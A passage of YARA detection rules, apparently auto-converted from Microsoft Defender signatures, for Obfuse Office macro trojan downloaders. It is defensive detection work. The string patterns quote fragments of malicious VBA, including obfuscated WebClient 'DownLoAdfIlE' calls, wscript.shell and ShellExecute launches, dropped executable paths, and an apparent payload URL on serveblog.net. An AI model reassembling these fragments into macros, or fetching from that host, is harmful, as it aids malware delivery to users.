        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 [0-22] 22 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_2 = {26 20 52 69 67 68 74 28 4c 65 66 74 28 [0-24] 2c 20 [0-24] 29 2c 20 32 29}  //weight: 1, accuracy: Low
        $x_1_3 = "= Chr(0" ascii //weight: 1
        $x_1_4 = {26 20 43 68 72 28 [0-20] 29 [0-66] 4e 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 32 20 54 6f 20 4c 65 6e 28 [0-24] 29 20 53 74 65 70 20 32}  //weight: 1, accuracy: Low
        $x_1_6 = {53 68 65 6c 6c 20 [0-20] 28 [0-1] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_QQ_2147744783_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.QQ!MTB"
        threat_id = "2147744783"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {24 45 4e 76 3a 74 65 4d 70 5c [0-16] 2e 22 20 26 20 4d 6f 64 75 6c 65 31 2e 4d 30 39 30 20 26 20 22}  //weight: 1, accuracy: Low
        $x_1_2 = {73 74 41 52 74 20 [0-1] 24 45 4e 76 3a 74 45 4d 50 5c [0-16] 2e 22 20 26 20 4d 6f 64 75 6c 65 31 2e 4d 30 39 30}  //weight: 1, accuracy: Low
        $x_1_3 = "= \"%temp%\" &" ascii //weight: 1
        $x_1_4 = {41 70 70 6c 69 63 61 74 69 6f 6e 2e 52 75 6e 20 [0-16] 20 26}  //weight: 1, accuracy: Low
        $x_1_5 = {43 61 6c 6c 20 53 68 65 6c 6c 28 [0-21] 26 20 22 20 22 20 26}  //weight: 1, accuracy: Low
        $x_1_6 = "= \"t system.net.wEBclIen\" & \"T\" & \")\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_QR_2147744832_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.QR!MTB"
        threat_id = "2147744832"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "echo wscript.sleep 3000" ascii //weight: 1
        $x_1_2 = "wscript.createobject(\"wscript.shell\").run" ascii //weight: 1
        $x_1_3 = "h\"\"tt\"\"p\"\":/\"\"/newscambodia.serveblog.net/blog/%ComputerName%.doc" ascii //weight: 1
        $x_1_4 = "C:\\ProgramData\\GET\\g.vbs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_QR_2147744832_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.QR!MTB"
        threat_id = "2147744832"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Q = Q + 0.40989414976 * Log(1.48302034194 + 26087.9031415742 * T)" ascii //weight: 1
        $x_1_2 = "SettingAttr.WriteLine (\"start c:\\Resources\\REDclif.exe\")" ascii //weight: 1
        $x_1_3 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 22 63 3a 5c 52 65 73 6f 75 72 63 65 73 5c [0-22] 2e 63 6d 64 22 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_4 = "& \"|\" & B & \"|\" &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_QT_2147744899_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.QT!MTB"
        threat_id = "2147744899"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2b 20 53 67 6e 28 49 6e 53 74 72 28 31 2c 20 [0-37] 2c 20 4d 69 64 28 [0-32] 2c 20 31 29 2c 20 76 62 42 69 6e 61 72 79 43 6f 6d 70 61 72 65 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-37] 29 20 53 74 65 70 20}  //weight: 1, accuracy: Low
        $x_1_3 = "& \"4b" ascii //weight: 1
        $x_1_4 = "& \"5" ascii //weight: 1
        $x_1_5 = "& \"7" ascii //weight: 1
        $x_1_6 = "333433" ascii //weight: 1
        $x_1_7 = "= IsNull(\"\")" ascii //weight: 1
        $x_1_8 = "= \"1Normal.ThisDocument\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_QT_2147744899_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.QT!MTB"
        threat_id = "2147744899"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"\" & Desaxop & \"\" & \"\\Gi.\" & \"\" & \"j\" & \"\" & \"s\" & \"\" & \"e\"" ascii //weight: 1
        $x_1_2 = "Mertop9 = \"\" & \"s\" & \"\" & \"h\" & \"\" & \"el\" & \"l\" & \"\"" ascii //weight: 1
        $x_1_3 = "& Empty & \"\\Tesla\" & Empty" ascii //weight: 1
        $x_1_4 = "& \"\"\"\", 0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_QU_2147744900_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.QU!MTB"
        threat_id = "2147744900"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Kiortnrr = Kiortnrr + 0.1110765978 * CSgn(3.96205090194 + 213.299095438 * J)" ascii //weight: 1
        $x_1_2 = "Beometrick1.WriteLine (\"start c:\\Resources\\REDclif.exe\")" ascii //weight: 1
        $x_1_3 = "myUserForm1.Phone.Caption)" ascii //weight: 1
        $x_1_4 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 22 63 3a 5c 52 65 73 6f 75 72 63 65 73 5c [0-24] 2e 63 6d 64 22 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_QV_2147744935_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.QV!MTB"
        threat_id = "2147744935"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "U7 = U7 - 0.00000000003 * Abs(0.82939608505 - 87253.177130155 * etcu1)" ascii //weight: 1
        $x_1_2 = "SettingAttr.WriteLine (\"start c:\\LogsMouse\\psico2.exe\")" ascii //weight: 1
        $x_1_3 = "ElevatedTrueFalse.TelNumber1.Caption" ascii //weight: 1
        $x_1_4 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 22 63 3a 5c 4c 6f 67 73 4d 6f 75 73 65 5c [0-24] 2e 63 6d 64 22 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_QX_2147745183_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.QX!MTB"
        threat_id = "2147745183"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Chr(\"&H\" & Mid(sData, iChar, 2))" ascii //weight: 1
        $x_1_2 = "= \"fuck\"" ascii //weight: 1
        $x_1_3 = "= \"you\"" ascii //weight: 1
        $x_1_4 = "= CreateObject(\"winmgmts:Win32_ProcessStartup\")" ascii //weight: 1
        $x_1_5 = {3d 20 6f 50 72 6f 63 65 73 73 2e 4d 65 74 68 6f 64 73 5f 28 73 48 65 78 44 65 63 6f 64 65 28 22 [0-21] 22 29 29 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_6 = "'MsgBox'MsgBox'" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_QL_2147745287_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.QL!MTB"
        threat_id = "2147745287"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "K7higm4W4E = K7higm4W4E & 6.50217347739 / QBColor(9.65617158663 & 26087.9031415742 / hgJOYU)" ascii //weight: 1
        $x_1_2 = ".cmd\", True)" ascii //weight: 1
        $x_1_3 = ".WriteLine (CreditBlank.PageDeposit.Caption)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_QW_2147745311_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.QW!MTB"
        threat_id = "2147745311"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 43 68 72 28 56 61 6c 28 [0-6] 28 22 [0-4] 22 29 20 26}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_3 = "& \"4b" ascii //weight: 1
        $x_1_4 = "& \"5" ascii //weight: 1
        $x_1_5 = "& \"7" ascii //weight: 1
        $x_1_6 = "333433" ascii //weight: 1
        $x_1_7 = "= IsNull(\"\")" ascii //weight: 1
        $x_1_8 = "= \"1Normal.ThisDocument\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RA_2147745326_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RA!MTB"
        threat_id = "2147745326"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Chr(92) & Rnd & \".jse\"" ascii //weight: 1
        $x_1_2 = {3d 20 45 6e 76 69 72 6f 6e 28 4d 69 64 28 22 [0-24] 22 2c 20 [0-5] 29 20 26 20 4d 69 64 28 [0-37] 29 20 26}  //weight: 1, accuracy: Low
        $x_1_3 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 54 61 62 6c 65 73 28 [0-1] 29 2e 43 65 6c 6c 28 [0-5] 29 2e 72 61 6e 67 65 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_4 = "CreateObject(Mid(" ascii //weight: 1
        $x_1_5 = ".Close" ascii //weight: 1
        $x_1_6 = "Trim(Left(str, Len(str) - 2)))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RD_2147745336_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RD!MTB"
        threat_id = "2147745336"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 [0-21] 22 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 32 20 54 6f 20 4c 65 6e 28 [0-18] 29 20 53 74 65 70 20 32}  //weight: 1, accuracy: Low
        $x_1_3 = {26 20 52 69 67 68 74 28 4c 65 66 74 28 [0-18] 2c 20 [0-18] 29 2c 20 32 29}  //weight: 1, accuracy: Low
        $x_1_4 = {43 68 72 28 30 20 2d 20 41 73 63 28 22 [0-1] 22 29 20 2b 20 41 73 63 28 [0-37] 20 2b 20 41 73 63 28 22 [0-1] 22 29 20 2d}  //weight: 1, accuracy: Low
        $x_1_5 = {26 20 43 68 72 28 [0-21] 28 [0-21] 28 [0-18] 2c 20 [0-16] 29 2c 20 [0-2] 29 29 [0-112] 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RE_2147745398_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RE!MTB"
        threat_id = "2147745398"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {24 45 4e 76 3a 70 75 62 6c 69 63 5c [0-8] 2e 22 20 26 20 4d 6f 64 75 6c 65 31 2e 4d 30 39 30 20 26 20 22}  //weight: 1, accuracy: Low
        $x_1_2 = "= \"exe\"" ascii //weight: 1
        $x_1_3 = "\"DownLoAdfIlE\" & _" ascii //weight: 1
        $x_1_4 = "= \"http:/\" &" ascii //weight: 1
        $x_1_5 = "\"%temp%\" &" ascii //weight: 1
        $x_1_6 = {43 61 6c 6c 20 53 68 65 6c 6c 28 [0-32] 20 26 20 22 20 22 20 26}  //weight: 1, accuracy: Low
        $x_1_7 = "\"(NEw-obj\" & \"E\" & \"c\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RG_2147745511_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RG!MTB"
        threat_id = "2147745511"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CurDep = CurDep + 74.11132765978 * Ceil(3.96232532932194 + 213.2993295438 * GetBack)" ascii //weight: 1
        $x_1_2 = "visitcmd.WriteLine (UserForm2.TravelIsland.Caption)" ascii //weight: 1
        $x_1_3 = "Segment #" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RG_2147745511_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RG!MTB"
        threat_id = "2147745511"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "#If Win64 Then" ascii //weight: 1
        $x_1_2 = "Private Declare PtrSafe Function WideCharToMultiByte Lib \"kernel32\" (ByVal" ascii //weight: 1
        $x_1_3 = {2e 56 61 6c 75 65 20 3d 20 57 53 2e 43 65 6c 6c 73 28 [0-16] 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_4 = {57 6f 72 6b 62 6f 6f 6b 73 28 22 [0-8] 2e 78 6c 73 22 29 2e 43 6c 6f 73 65}  //weight: 1, accuracy: Low
        $x_1_5 = "Replace(Replace(ToBase64," ascii //weight: 1
        $x_1_6 = "ToBase64 = .text" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RH_2147745968_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RH!MTB"
        threat_id = "2147745968"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 43 68 72 24 28 56 61 6c 28 22 26 68 22 20 26 20 [0-32] 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = "& \"4b" ascii //weight: 1
        $x_1_3 = "& \"5" ascii //weight: 1
        $x_1_4 = "& \"7" ascii //weight: 1
        $x_1_5 = "333433" ascii //weight: 1
        $x_1_6 = "= IsObject(\"\")" ascii //weight: 1
        $x_1_7 = "& \"\" &" ascii //weight: 1
        $x_1_8 = "= \"1Normal.ThisDocument\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RI_2147746017_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RI!MTB"
        threat_id = "2147746017"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 43 68 72 28 56 61 6c 28 22 26 22 20 26 20 22 48 22 [0-4] 26 20 4d 69 64 24 28 [0-32] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = "& \"4b" ascii //weight: 1
        $x_1_3 = "& \"5" ascii //weight: 1
        $x_1_4 = "& \"7" ascii //weight: 1
        $x_1_5 = "= IsEmpty(\"\")" ascii //weight: 1
        $x_1_6 = "& \"\" &" ascii //weight: 1
        $x_1_7 = "= \"1Normal.ThisDocument\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AA_2147746121_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AA!eml"
        threat_id = "2147746121"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "eml: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = {52 65 70 6c 61 63 65 28 22 ?? 22 2c 20 22 [0-15] 22 2c 20 22 22}  //weight: 1, accuracy: Low
        $x_1_3 = "Application.Selection.InsertNewPage" ascii //weight: 1
        $x_1_4 = "GetTickCount Lib \"kernel32\" () As Long" ascii //weight: 1
        $x_1_5 = "ActiveDocument.ActiveWindow.View.DisplayBackgrounds = False" ascii //weight: 1
        $x_1_6 = "ActiveDocument.Range.Delete" ascii //weight: 1
        $x_1_7 = "Xor Len(" ascii //weight: 1
        $x_1_8 = "Or Val(\" " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AK_2147747832_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AK!eml"
        threat_id = "2147747832"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "eml: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub Document_Open()" ascii //weight: 1
        $x_1_2 = "CreateObject(Mid(mgs.CountPages.Page2.RunTextBox.Value, 9, 17)).ShellExecute thing" ascii //weight: 1
        $x_1_3 = "wanttosleep = wanttosleep & fullL" ascii //weight: 1
        $x_1_4 = "otherthinh (tempV)" ascii //weight: 1
        $x_1_5 = "fuji tempV, idontknow" ascii //weight: 1
        $x_1_6 = "= re.Start" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AK_2147747832_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AK!eml"
        threat_id = "2147747832"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "eml: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 49 74 65 6d 28 29 2e 44 6f 63 75 6d 65 6e 74 2e 41 70 70 6c 69 63 61 74 69 6f 6e 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 [0-26] 2c 20 [0-28] 20 26 20 [0-27] 2c 20 [0-30] 28}  //weight: 1, accuracy: Low
        $x_1_2 = "shurl = Val(Replace(\"O\", \"O\", \"&\") & Replace(\"h\", \"h\", \"H\") & Mid(" ascii //weight: 1
        $x_1_3 = "crul = Chr(shurl)" ascii //weight: 1
        $x_1_4 = {49 66 20 28 56 61 6c 28 41 70 70 6c 69 63 61 74 69 6f 6e 2e 56 65 72 73 69 6f 6e 29 29 20 54 68 65 6e [0-30] 20 3d 20 41 72 72 61 79 28}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RJ_2147747853_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RJ!MTB"
        threat_id = "2147747853"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "SpecialPath = WshShell.SpecialFolders(\"Templates\")" ascii //weight: 1
        $x_1_2 = "Dim WshShell As Object" ascii //weight: 1
        $x_1_3 = "= Chr(50) + Chr(48) + Chr(48)" ascii //weight: 1
        $x_1_4 = ".Status = 200 Then" ascii //weight: 1
        $x_1_5 = ".Open \"get\"," ascii //weight: 1
        $x_1_6 = "For i = 1 To Len(" ascii //weight: 1
        $x_1_7 = {2e 43 6c 6f 73 65 02 00 45 6e 64 20 49 66}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RK_2147747908_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RK!MTB"
        threat_id = "2147747908"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 48 22 29 2e 56 61 6c 75 65 20 26 20 52 69 67 68 74 28 4c 65 66 74 28 [0-32] 2c 20 [0-32] 29 2c 20 32 29}  //weight: 1, accuracy: Low
        $x_1_2 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 [0-24] 22 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 43 68 72 28 43 4c 6e 67 28 [0-21] 29 20 2d 20 ?? ?? 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_4 = "Shell " ascii //weight: 1
        $x_1_5 = "Option Explicit" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RL_2147747982_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RL!MTB"
        threat_id = "2147747982"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= IsEmpty(\"\")" ascii //weight: 1
        $x_1_2 = "= IsNumeric(\"\")" ascii //weight: 1
        $x_1_3 = {2e 49 74 65 6d 28 29 2e 44 6f 63 75 6d 65 6e 74 2e 41 70 70 6c 69 63 61 74 69 6f 6e 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 [0-21] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 22 [0-16] 22 2c 20 22 [0-16] 22 2c 20 22 26 22 29 20 5f}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 52 65 70 6c 61 63 65 28 22 [0-6] 22 2c 20 22 [0-6] 22 2c 20 22 48 22 29}  //weight: 1, accuracy: Low
        $x_1_6 = {26 20 52 65 70 6c 61 63 65 28 22 [0-6] 22 2c 20 22 [0-6] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_7 = "& \"4" ascii //weight: 1
        $x_1_8 = "& \"3" ascii //weight: 1
        $x_1_9 = "& \"2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RL_2147747982_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RL!MTB"
        threat_id = "2147747982"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
